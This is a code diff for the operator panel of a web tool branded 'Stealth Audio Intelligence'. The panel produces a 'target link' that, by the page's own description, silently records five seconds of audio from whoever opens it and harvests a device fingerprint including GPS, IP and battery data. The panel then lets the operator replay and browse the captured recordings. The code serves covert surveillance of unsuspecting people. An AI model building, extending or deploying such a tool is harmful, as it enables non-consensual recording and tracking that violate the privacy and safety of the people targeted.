@@ -2,8 +2,9 @@ import { useState, useEffect } from "react";
 import { Link } from "react-router-dom";
 import { 
   Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
-  LucideIcon, Sparkles, Headphones, Info, Link2, Smartphone,
-  Database, Play, Trash2, RefreshCw, Volume2, FileJson
+  Headphones, Info, Link2, Smartphone, Database, 
+  Trash2, RefreshCw, Volume2, FileJson, Radio, Waves,
+  Shield, Zap, Signal
 } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -12,16 +13,7 @@ import { useSettings } from "@/contexts/SettingsContext";
 import { useAuth } from "@/contexts/AuthContext";
 import { supabase } from "@/integrations/supabase/client";
 import CreditDisplay from "@/components/CreditDisplay";
-import FeatureCard from "@/components/FeatureCard";
 import { cn } from "@/lib/utils";
-
-interface Page2Tab {
-  id: string;
-  label: string;
-  icon: LucideIcon;
-  color: string;
-  description: string;
-}
 
 interface CapturedData {
   id: string;
@@ -31,32 +23,13 @@ interface CapturedData {
   user_agent: string | null;
 }
 
-const page2Tabs: Page2Tab[] = [
-  { 
-    id: "audiocapture", 
-    label: "AUDIO CAPTURE", 
-    icon: Mic, 
-    color: "pink",
-    description: "5 sec audio + device info capture"
-  },
-  { 
-    id: "media", 
-    label: "MEDIA", 
-    icon: Database, 
-    color: "cyan",
-    description: "View captured data"
-  },
-];
-
 const Page2 = () => {
   const { settings } = useSettings();
   const { isLoading: authLoading } = useAuth();
-  const [activeTab, setActiveTab] = useState<string | null>(null);
+  const [activeSection, setActiveSection] = useState<"capture" | "media">("capture");
   const [copiedLink, setCopiedLink] = useState(false);
   const [capturedData, setCapturedData] = useState<CapturedData[]>([]);
   const [isLoadingData, setIsLoadingData] = useState(false);
-
-  const activeTabData = page2Tabs.find(tab => tab.id === activeTab);
 
   // Generate capture link
   const baseUrl = window.location.origin;
@@ -88,7 +61,7 @@ const Page2 = () => {
       const { error } = await supabase.from("captured_photos").delete().eq("id", id);
       if (error) throw error;
       setCapturedData(prev => prev.filter(item => item.id !== id));
-      toast({ title: "Deleted!", description: "Item removed successfully" });
+      toast({ title: "Deleted!", description: "Item removed" });
     } catch (err) {
       toast({ title: "Error", description: "Failed to delete", variant: "destructive" });
     }
@@ -106,224 +79,223 @@ const Page2 = () => {
       setCapturedData([]);
       toast({ title: "Cleared!", description: "All data removed" });
     } catch (err) {
-      toast({ title: "Error", description: "Failed to clear data", variant: "destructive" });
+      toast({ title: "Error", description: "Failed to clear", variant: "destructive" });
     }
   };
 
   useEffect(() => {
-    if (activeTab === "media") {
+    if (activeSection === "media") {
       fetchCapturedData();
     }
-  }, [activeTab, sessionId]);
+  }, [activeSection, sessionId]);
 
   const copyLink = async () => {
     await navigator.clipboard.writeText(captureLink);
     setCopiedLink(true);
-    toast({ title: "Link Copied!", description: "Audio capture link copied to clipboard" });
+    toast({ title: "Copied!", description: "Link copied to clipboard" });
     setTimeout(() => setCopiedLink(false), 2000);
-  };
-
-  const handleTabClick = (tabId: string) => {
-    if (activeTab === tabId) {
-      setActiveTab(null);
-    } else {
-      setActiveTab(tabId);
-    }
   };
 
   if (authLoading) {
     return (
-      <div className="min-h-[100dvh] bg-background flex items-center justify-center">
-        <Loader2 className="w-8 h-8 text-neon-green animate-spin" />
+      <div className="min-h-[100dvh] bg-black flex items-center justify-center">
+        <Loader2 className="w-8 h-8 text-red-500 animate-spin" />
       </div>
     );
   }
 
   return (
-    <div className="min-h-[100dvh] bg-background relative overflow-hidden">
-      {/* Background */}
-      <div className="fixed inset-0 pointer-events-none">
-        {settings.backgroundImage ? (
-          <div 
-            className="absolute inset-0 bg-fixed-stable"
-            style={{ 
-              backgroundImage: `url(${settings.backgroundImage})`,
-              backgroundSize: 'cover',
-              backgroundPosition: 'center',
-              backgroundRepeat: 'no-repeat',
-              opacity: (parseInt(settings.backgroundOpacity || "30") / 100)
-            }}
-          />
-        ) : (
-          <>
-            <div className="absolute inset-0 bg-gradient-to-br from-background via-background to-background" />
-            <div className="absolute top-[10%] left-[10%] w-[300px] h-[300px] bg-neon-pink/8 rounded-full blur-[100px]" />
-            <div className="absolute top-[50%] right-[5%] w-[250px] h-[250px] bg-neon-cyan/8 rounded-full blur-[100px]" />
-            <div className="absolute bottom-[10%] left-[20%] w-[200px] h-[200px] bg-neon-purple/8 rounded-full blur-[100px]" />
-          </>
-        )}
-        
-        <div className="absolute top-0 left-0 right-0 h-24 bg-gradient-to-b from-background to-transparent" />
-        <div className="absolute bottom-0 left-0 right-0 h-24 bg-gradient-to-t from-background to-transparent" />
+    <div className="min-h-[100dvh] bg-gradient-to-b from-black via-gray-950 to-black relative overflow-hidden">
+      {/* Red Grid Background */}
+      <div className="fixed inset-0 pointer-events-none overflow-hidden">
+        <div 
+          className="absolute inset-0 opacity-[0.03]"
+          style={{
+            backgroundImage: `
+              linear-gradient(rgba(239, 68, 68, 0.3) 1px, transparent 1px),
+              linear-gradient(90deg, rgba(239, 68, 68, 0.3) 1px, transparent 1px)
+            `,
+            backgroundSize: '50px 50px'
+          }}
+        />
+        {/* Red Glow */}
+        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[300px] bg-red-600/10 rounded-full blur-[120px]" />
+        <div className="absolute bottom-0 left-0 w-[300px] h-[300px] bg-orange-600/5 rounded-full blur-[100px]" />
       </div>
-      
+
       {/* Content */}
       <div className="relative z-10 min-h-[100dvh] flex flex-col">
         {/* Header */}
-        <header className="px-4 py-4">
-          <div className="flex items-center justify-between max-w-3xl mx-auto">
+        <header className="px-4 py-3 border-b border-red-500/20 bg-black/50 backdrop-blur-xl">
+          <div className="flex items-center justify-between max-w-2xl mx-auto">
             <Link 
               to="/" 
-              className="flex items-center gap-2 px-3 py-2 rounded-xl border border-neon-cyan/30 bg-card/50 text-neon-cyan hover:bg-neon-cyan/10 transition-all group"
+              className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-red-500/30 bg-red-500/10 text-red-400 hover:bg-red-500/20 transition-all text-xs font-medium"
             >
-              <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
-              <span className="text-xs font-bold uppercase tracking-wider">Back</span>
+              <ArrowLeft className="w-3.5 h-3.5" />
+              BACK
             </Link>
             
-            <div className="text-center">
-              <h1 className="text-lg font-display font-bold bg-gradient-to-r from-neon-pink via-neon-cyan to-neon-purple bg-clip-text text-transparent">
-                PAGE 2
-              </h1>
+            <div className="flex items-center gap-2">
+              <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 border border-red-500/30">
+                <Radio className="w-3.5 h-3.5 text-red-500 animate-pulse" />
+                <span className="text-[10px] font-bold text-red-400 uppercase tracking-wider">Audio Lab</span>
+              </div>
             </div>
             
             <CreditDisplay />
           </div>
         </header>
-        
-        {/* Main Content */}
-        <main className="flex-1 px-4 pb-6">
-          <div className="max-w-3xl mx-auto space-y-4">
-            {/* Tab Grid - Similar to Page 1 */}
-            <div className="grid grid-cols-4 gap-2">
-              {page2Tabs.map((tab) => (
-                <div key={tab.id}>
-                  <FeatureCard
-                    icon={tab.icon}
-                    label={tab.label}
-                    color={tab.color}
-                    active={tab.id === activeTab}
-                    onClick={() => handleTabClick(tab.id)}
-                  />
-                </div>
-              ))}
-              
-              {/* Back to Page 1 Button */}
-              <Link to="/">
-                <div className={cn(
-                  "flex flex-col items-center gap-1 p-2 rounded-lg border transition-colors",
-                  "bg-gradient-to-br from-neon-green/20 to-neon-green/5",
-                  "border-neon-green/40 hover:border-neon-green"
-                )}>
-                  <div className="w-7 h-7 rounded-md bg-gradient-to-br from-background/80 to-background/40 border border-neon-green/30 flex items-center justify-center text-neon-green">
-                    <ArrowLeft className="w-3.5 h-3.5" />
-                  </div>
-                  <span className="text-[8px] font-bold tracking-wide uppercase text-neon-green">Page 1</span>
-                </div>
-              </Link>
+
+        {/* Hero Section */}
+        <div className="px-4 py-6 text-center border-b border-red-500/10">
+          <div className="max-w-2xl mx-auto">
+            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-gradient-to-r from-red-500/20 to-orange-500/20 border border-red-500/30 mb-3">
+              <Waves className="w-4 h-4 text-red-400" />
+              <span className="text-xs font-bold text-red-300">STEALTH AUDIO INTELLIGENCE</span>
+              <Waves className="w-4 h-4 text-red-400" />
             </div>
+            <h1 className="text-2xl font-black text-white mb-2 tracking-tight">
+              AUDIO <span className="text-transparent bg-clip-text bg-gradient-to-r from-red-500 to-orange-500">CAPTURE</span>
+            </h1>
+            <p className="text-xs text-gray-500">Silent 5-second recording + Full device fingerprinting</p>
+          </div>
+        </div>
 
-            {/* Audio Capture Panel */}
-            {activeTabData?.id === "audiocapture" && (
-              <div className="rounded-xl bg-gradient-to-br from-card/90 to-card/70 border border-neon-pink/40 p-4 overflow-hidden">
-                {/* Header */}
-                <div className="flex items-center gap-3 mb-4">
-                  <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-neon-pink/30 to-neon-purple/20 border border-neon-pink/40 flex items-center justify-center">
-                    <Mic className="w-6 h-6 text-neon-pink" />
-                  </div>
-                  <div>
-                    <h2 className="text-sm font-bold text-foreground">AUDIO CAPTURE</h2>
-                    <p className="text-[10px] text-muted-foreground">5 sec audio + device info</p>
-                  </div>
-                </div>
+        {/* Tab Switch */}
+        <div className="px-4 py-3 border-b border-red-500/10">
+          <div className="max-w-2xl mx-auto flex gap-2">
+            <button
+              onClick={() => setActiveSection("capture")}
+              className={cn(
+                "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider transition-all",
+                activeSection === "capture"
+                  ? "bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-lg shadow-red-500/25"
+                  : "bg-gray-900/50 text-gray-500 border border-gray-800 hover:border-red-500/30"
+              )}
+            >
+              <Mic className="w-4 h-4" />
+              Capture
+            </button>
+            <button
+              onClick={() => setActiveSection("media")}
+              className={cn(
+                "flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-xs font-bold uppercase tracking-wider transition-all",
+                activeSection === "media"
+                  ? "bg-gradient-to-r from-red-600 to-orange-600 text-white shadow-lg shadow-red-500/25"
+                  : "bg-gray-900/50 text-gray-500 border border-gray-800 hover:border-red-500/30"
+              )}
+            >
+              <Database className="w-4 h-4" />
+              Data ({capturedData.length})
+            </button>
+          </div>
+        </div>
 
-                {/* Description */}
-                <div className="mb-4 p-3 rounded-lg bg-neon-pink/5 border border-neon-pink/20">
-                  <div className="flex items-start gap-2">
-                    <Info className="w-4 h-4 text-neon-pink flex-shrink-0 mt-0.5" />
-                    <p className="text-[11px] text-muted-foreground leading-relaxed">
-                      Link pe click karne pe target ka <span className="text-neon-cyan font-bold">5 second audio</span> record 
-                      hoga aur saath me full <span className="text-neon-purple font-bold">device info</span> capture hogi 
-                      (browser, screen, language, timezone, battery etc.)
-                    </p>
+        {/* Main Content */}
+        <main className="flex-1 px-4 py-4">
+          <div className="max-w-2xl mx-auto">
+            
+            {/* Capture Section */}
+            {activeSection === "capture" && (
+              <div className="space-y-4">
+                {/* Info Card */}
+                <div className="p-4 rounded-xl bg-gradient-to-br from-red-500/10 to-orange-500/5 border border-red-500/20">
+                  <div className="flex items-start gap-3">
+                    <div className="w-10 h-10 rounded-lg bg-red-500/20 flex items-center justify-center flex-shrink-0">
+                      <Info className="w-5 h-5 text-red-400" />
+                    </div>
+                    <div className="text-xs text-gray-400 leading-relaxed">
+                      Target link pe click karega to <span className="text-red-400 font-bold">5 second audio</span> silently record hoga + full <span className="text-orange-400 font-bold">device fingerprint</span> capture hogi.
+                    </div>
                   </div>
                 </div>
 
                 {/* Session ID */}
-                <div className="mb-4">
-                  <label className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider mb-1.5 block">
+                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
+                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 block">
                     Session ID
                   </label>
-                  <Input
-                    value={sessionId}
-                    readOnly
-                    className="h-10 bg-background/60 border-neon-pink/30 text-foreground font-mono text-sm"
-                  />
-                  <p className="text-[9px] text-muted-foreground mt-1">Admin Panel se change karo</p>
+                  <div className="flex items-center gap-2 p-3 rounded-lg bg-black/50 border border-gray-800">
+                    <Signal className="w-4 h-4 text-red-500" />
+                    <span className="text-sm font-mono text-white">{sessionId}</span>
+                  </div>
+                  <p className="text-[9px] text-gray-600 mt-2">Change from Admin Panel → CAM settings</p>
                 </div>
 
                 {/* Generated Link */}
-                <div className="mb-4">
-                  <label className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider mb-1.5 block flex items-center gap-1.5">
+                <div className="p-4 rounded-xl bg-gray-900/50 border border-gray-800">
+                  <label className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                     <Link2 className="w-3 h-3" />
-                    Capture Link
+                    Target Link
                   </label>
                   <div className="flex gap-2">
                     <Input
                       value={captureLink}
                       readOnly
-                      className="flex-1 h-10 bg-background/60 border-neon-cyan/30 text-neon-cyan font-mono text-xs"
+                      className="flex-1 h-10 bg-black/50 border-gray-700 text-red-400 font-mono text-xs focus:border-red-500"
                     />
                     <Button
                       onClick={copyLink}
-                      className="h-10 px-4 bg-gradient-to-r from-neon-pink to-neon-purple hover:opacity-90"
+                      className="h-10 px-4 bg-red-600 hover:bg-red-700 text-white"
                     >
-                      {copiedLink ? (
-                        <Check className="w-4 h-4" />
-                      ) : (
-                        <Copy className="w-4 h-4" />
-                      )}
+                      {copiedLink ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                     </Button>
                   </div>
                 </div>
 
-                {/* Open Link Button */}
+                {/* Action Button */}
                 <Button
                   onClick={() => window.open(captureLink, '_blank')}
-                  className="w-full h-11 bg-gradient-to-r from-neon-pink via-neon-purple to-neon-cyan text-background font-bold hover:opacity-90"
+                  className="w-full h-12 bg-gradient-to-r from-red-600 via-red-500 to-orange-600 hover:opacity-90 text-white font-bold text-sm shadow-lg shadow-red-500/30"
                 >
                   <ExternalLink className="w-4 h-4 mr-2" />
-                  Open Link (Test)
+                  TEST LINK
                 </Button>
 
-                {/* Features Grid */}
-                <div className="grid grid-cols-2 gap-2 mt-4">
-                  <div className="p-3 rounded-lg bg-neon-pink/10 border border-neon-pink/20 text-center">
-                    <Headphones className="w-5 h-5 mx-auto mb-1 text-neon-pink" />
-                    <p className="text-[10px] font-bold text-neon-pink">5 SEC AUDIO</p>
-                    <p className="text-[8px] text-muted-foreground">Auto record</p>
+                {/* Features */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div className="p-4 rounded-xl bg-gray-900/30 border border-gray-800 text-center">
+                    <div className="w-10 h-10 mx-auto mb-2 rounded-lg bg-red-500/20 flex items-center justify-center">
+                      <Headphones className="w-5 h-5 text-red-400" />
+                    </div>
+                    <p className="text-[11px] font-bold text-white">5 SEC AUDIO</p>
+                    <p className="text-[9px] text-gray-600">Silent capture</p>
                   </div>
-                  <div className="p-3 rounded-lg bg-neon-cyan/10 border border-neon-cyan/20 text-center">
-                    <Smartphone className="w-5 h-5 mx-auto mb-1 text-neon-cyan" />
-                    <p className="text-[10px] font-bold text-neon-cyan">DEVICE INFO</p>
-                    <p className="text-[8px] text-muted-foreground">Full details</p>
+                  <div className="p-4 rounded-xl bg-gray-900/30 border border-gray-800 text-center">
+                    <div className="w-10 h-10 mx-auto mb-2 rounded-lg bg-orange-500/20 flex items-center justify-center">
+                      <Smartphone className="w-5 h-5 text-orange-400" />
+                    </div>
+                    <p className="text-[11px] font-bold text-white">DEVICE INFO</p>
+                    <p className="text-[9px] text-gray-600">Full fingerprint</p>
+                  </div>
+                </div>
+
+                {/* What's Captured */}
+                <div className="p-4 rounded-xl bg-gray-900/30 border border-gray-800">
+                  <p className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mb-3">Captured Data</p>
+                  <div className="flex flex-wrap gap-1.5">
+                    {["Browser", "Screen", "Language", "Timezone", "Battery", "GPS", "IP", "OS"].map((item) => (
+                      <span key={item} className="px-2 py-1 rounded-md bg-red-500/10 border border-red-500/20 text-[9px] font-medium text-red-400">
+                        {item}
+                      </span>
+                    ))}
                   </div>
                 </div>
               </div>
             )}
 
-            {/* Media Panel */}
-            {activeTabData?.id === "media" && (
-              <div className="rounded-xl bg-gradient-to-br from-card/90 to-card/70 border border-neon-cyan/40 p-4 overflow-hidden">
+            {/* Media Section */}
+            {activeSection === "media" && (
+              <div className="space-y-4">
                 {/* Header */}
-                <div className="flex items-center justify-between mb-4">
-                  <div className="flex items-center gap-3">
-                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-neon-cyan/30 to-neon-purple/20 border border-neon-cyan/40 flex items-center justify-center">
-                      <Database className="w-6 h-6 text-neon-cyan" />
-                    </div>
-                    <div>
-                      <h2 className="text-sm font-bold text-foreground">CAPTURED DATA</h2>
-                      <p className="text-[10px] text-muted-foreground">Session: {sessionId}</p>
-                    </div>
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2">
+                    <Database className="w-4 h-4 text-red-400" />
+                    <span className="text-xs font-bold text-white uppercase">Captured Data</span>
+                    <span className="px-2 py-0.5 rounded-full bg-red-500/20 text-[10px] font-bold text-red-400">
+                      {capturedData.length}
+                    </span>
                   </div>
                   <div className="flex gap-2">
                     <Button
@@ -331,7 +303,7 @@ const Page2 = () => {
                       variant="outline"
                       onClick={fetchCapturedData}
                       disabled={isLoadingData}
-                      className="h-8 px-3 border-neon-cyan/40 text-neon-cyan hover:bg-neon-cyan/10"
+                      className="h-8 px-3 border-gray-700 text-gray-400 hover:bg-gray-800"
                     >
                       <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
                     </Button>
@@ -340,7 +312,7 @@ const Page2 = () => {
                         size="sm"
                         variant="outline"
                         onClick={clearAllData}
-                        className="h-8 px-3 border-red-500/40 text-red-400 hover:bg-red-500/10"
+                        className="h-8 px-3 border-red-500/30 text-red-400 hover:bg-red-500/10"
                       >
                         <Trash2 className="w-3.5 h-3.5" />
                       </Button>
@@ -350,17 +322,17 @@ const Page2 = () => {
 
                 {/* Data List */}
                 {isLoadingData ? (
-                  <div className="flex items-center justify-center py-8">
-                    <Loader2 className="w-6 h-6 text-neon-cyan animate-spin" />
+                  <div className="flex items-center justify-center py-12">
+                    <Loader2 className="w-6 h-6 text-red-500 animate-spin" />
                   </div>
                 ) : capturedData.length === 0 ? (
-                  <div className="text-center py-8">
-                    <Database className="w-10 h-10 mx-auto mb-2 text-muted-foreground/40" />
-                    <p className="text-xs text-muted-foreground">No data captured yet</p>
-                    <p className="text-[10px] text-muted-foreground/60">Share the link to start capturing</p>
+                  <div className="text-center py-12 rounded-xl bg-gray-900/30 border border-gray-800">
+                    <Database className="w-12 h-12 mx-auto mb-3 text-gray-700" />
+                    <p className="text-sm font-medium text-gray-500">No data captured</p>
+                    <p className="text-[10px] text-gray-600 mt-1">Share the link to start</p>
                   </div>
                 ) : (
-                  <div className="space-y-3 max-h-[400px] overflow-y-auto pr-1">
+                  <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
                     {capturedData.map((item) => {
                       const isDeviceInfo = item.session_id.endsWith("_deviceinfo");
                       const isAudio = item.image_data.startsWith("data:audio");
@@ -369,27 +341,32 @@ const Page2 = () => {
                         <div 
                           key={item.id}
                           className={cn(
-                            "p-3 rounded-lg border",
+                            "p-4 rounded-xl border",
                             isDeviceInfo 
-                              ? "bg-neon-purple/10 border-neon-purple/30" 
-                              : "bg-neon-pink/10 border-neon-pink/30"
+                              ? "bg-orange-500/5 border-orange-500/20" 
+                              : "bg-red-500/5 border-red-500/20"
                           )}
                         >
-                          <div className="flex items-start justify-between gap-2">
-                            <div className="flex items-center gap-2 flex-1 min-w-0">
-                              {isDeviceInfo ? (
-                                <FileJson className="w-5 h-5 text-neon-purple flex-shrink-0" />
-                              ) : (
-                                <Volume2 className="w-5 h-5 text-neon-pink flex-shrink-0" />
-                              )}
-                              <div className="flex-1 min-w-0">
+                          <div className="flex items-start justify-between gap-3 mb-3">
+                            <div className="flex items-center gap-3">
+                              <div className={cn(
+                                "w-9 h-9 rounded-lg flex items-center justify-center",
+                                isDeviceInfo ? "bg-orange-500/20" : "bg-red-500/20"
+                              )}>
+                                {isDeviceInfo ? (
+                                  <FileJson className="w-4 h-4 text-orange-400" />
+                                ) : (
+                                  <Volume2 className="w-4 h-4 text-red-400" />
+                                )}
+                              </div>
+                              <div>
                                 <p className={cn(
                                   "text-xs font-bold",
-                                  isDeviceInfo ? "text-neon-purple" : "text-neon-pink"
+                                  isDeviceInfo ? "text-orange-400" : "text-red-400"
                                 )}>
-                                  {isDeviceInfo ? "DEVICE INFO" : "AUDIO (5 sec)"}
+                                  {isDeviceInfo ? "DEVICE INFO" : "AUDIO RECORDING"}
                                 </p>
-                                <p className="text-[9px] text-muted-foreground truncate">
+                                <p className="text-[9px] text-gray-500">
                                   {new Date(item.captured_at).toLocaleString()}
                                 </p>
                               </div>
@@ -398,7 +375,7 @@ const Page2 = () => {
                               size="sm"
                               variant="ghost"
                               onClick={() => deleteItem(item.id)}
-                              className="h-7 w-7 p-0 text-red-400 hover:bg-red-500/20"
+                              className="h-8 w-8 p-0 text-red-400 hover:bg-red-500/20"
                             >
                               <Trash2 className="w-3.5 h-3.5" />
                             </Button>
@@ -406,8 +383,8 @@ const Page2 = () => {
                           
                           {/* Content */}
                           {isDeviceInfo ? (
-                            <div className="mt-2 p-2 rounded bg-background/50 max-h-32 overflow-y-auto">
-                              <pre className="text-[9px] text-muted-foreground whitespace-pre-wrap break-all font-mono">
+                            <div className="p-3 rounded-lg bg-black/30 max-h-40 overflow-y-auto">
+                              <pre className="text-[9px] text-gray-400 whitespace-pre-wrap break-all font-mono">
                                 {(() => {
                                   try {
                                     return JSON.stringify(JSON.parse(item.image_data), null, 2);
@@ -418,14 +395,12 @@ const Page2 = () => {
                               </pre>
                             </div>
                           ) : isAudio ? (
-                            <div className="mt-2">
-                              <audio controls className="w-full h-8" src={item.image_data}>
-                                Your browser does not support audio.
-                              </audio>
-                            </div>
+                            <audio controls className="w-full h-10" src={item.image_data}>
+                              Your browser does not support audio.
+                            </audio>
                           ) : (
-                            <div className="mt-2 p-2 rounded bg-background/50">
-                              <p className="text-[9px] text-muted-foreground truncate">
+                            <div className="p-3 rounded-lg bg-black/30">
+                              <p className="text-[9px] text-gray-500 truncate font-mono">
                                 {item.image_data.substring(0, 100)}...
                               </p>
                             </div>
@@ -437,27 +412,21 @@ const Page2 = () => {
                 )}
               </div>
             )}
-
-            {/* Empty State when no tab selected */}
-            {!activeTab && (
-              <div className="text-center py-12">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-neon-pink/20 to-neon-purple/20 flex items-center justify-center">
-                  <Sparkles className="w-8 h-8 text-neon-pink" />
-                </div>
-                <h3 className="text-sm font-bold text-foreground mb-1">Select a Feature</h3>
-                <p className="text-[11px] text-muted-foreground">Click on a tab above to get started</p>
-              </div>
-            )}
           </div>
         </main>
-        
+
         {/* Footer */}
-        <footer className="text-center py-4 px-4">
-          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-card/50 border border-neon-pink/20">
-            <div className="w-1.5 h-1.5 bg-neon-pink rounded-full animate-pulse" />
-            <p className="text-[10px] text-muted-foreground/60 font-mono tracking-wider">
-              PAGE 2 • ADVANCED TOOLS
-            </p>
+        <footer className="px-4 py-3 border-t border-red-500/10">
+          <div className="max-w-2xl mx-auto flex items-center justify-center gap-3">
+            <div className="flex items-center gap-1.5">
+              <Shield className="w-3 h-3 text-red-500" />
+              <span className="text-[9px] text-gray-600 uppercase tracking-wider">Encrypted</span>
+            </div>
+            <span className="text-gray-700">•</span>
+            <div className="flex items-center gap-1.5">
+              <Zap className="w-3 h-3 text-orange-500" />
+              <span className="text-[9px] text-gray-600 uppercase tracking-wider">Audio Lab v2</span>
+            </div>
           </div>
         </footer>
       </div>
